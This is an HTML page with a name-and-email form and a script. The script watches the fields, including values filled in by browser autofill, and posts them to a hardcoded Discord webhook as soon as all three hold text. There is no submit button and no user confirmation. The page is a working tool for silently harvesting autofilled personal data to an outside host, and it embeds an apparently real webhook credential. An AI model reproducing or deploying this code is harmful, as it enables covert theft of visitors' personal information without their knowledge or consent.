<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Auto-Fill and Auto-Submit Form</title>
</head>
<body>
  <h1>User Information Form</h1>

  <form id="userForm" autocomplete="on">
    <label for="fname">First Name</label><br>
    <input type="text" id="fname" name="given-name" autocomplete="given-name" required><br><br>

    <label for="lname">Last Name</label><br>
    <input type="text" id="lname" name="family-name" autocomplete="family-name" required><br><br>

    <label for="email">Email</label><br>
    <input type="email" id="email" name="email" autocomplete="email" required><br><br>
  </form>

  <script>
    // Replace with your actual Discord webhook URL
    const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1316507623830458530/AJs1HDBblw6pbV0MldGNLKA3pusxfwjPjFg1qKZ7qO3UcCLtkbTv5SIHvXTVS1FK9z58';

    const form = document.getElementById('userForm');
    const fnameField = document.getElementById('fname');
    const lnameField = document.getElementById('lname');
    const emailField = document.getElementById('email');

    function checkFields() {
      if (fnameField.value.trim() !== '' && lnameField.value.trim() !== '' && emailField.value.trim() !== '') {
        // Once all fields are filled, submit the form
        submitForm();
      }
    }

    function submitForm() {
      // Gather form data
      const fname = fnameField.value.trim();
      const lname = lnameField.value.trim();
      const email = emailField.value.trim();

      // Prevent default form submission since we want to handle it via fetch
      // There's no submit button, but we can manually send data to Discord
      sendToDiscord(fname, lname, email);
    }

    function sendToDiscord(fname, lname, email) {
      const message = `New user info submitted:\n**First Name:** ${fname}\n**Last Name:** ${lname}\n**Email:** ${email}`;

      fetch(DISCORD_WEBHOOK_URL, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ content: message })
      })
      .then(response => {
        if (response.ok) {
          console.log('Message sent to Discord successfully!');
        } else {
          console.error('Failed to send message to Discord:', response.status, response.statusText);
        }
      })
      .catch(err => console.error('Error sending message to Discord:', err));
    }

    // Listen to changes to detect autofill
    fnameField.addEventListener('input', checkFields);
    lnameField.addEventListener('input', checkFields);
    emailField.addEventListener('input', checkFields);

    fnameField.addEventListener('change', checkFields);
    lnameField.addEventListener('change', checkFields);
    emailField.addEventListener('change', checkFields);
  </script>
</body>
</html>
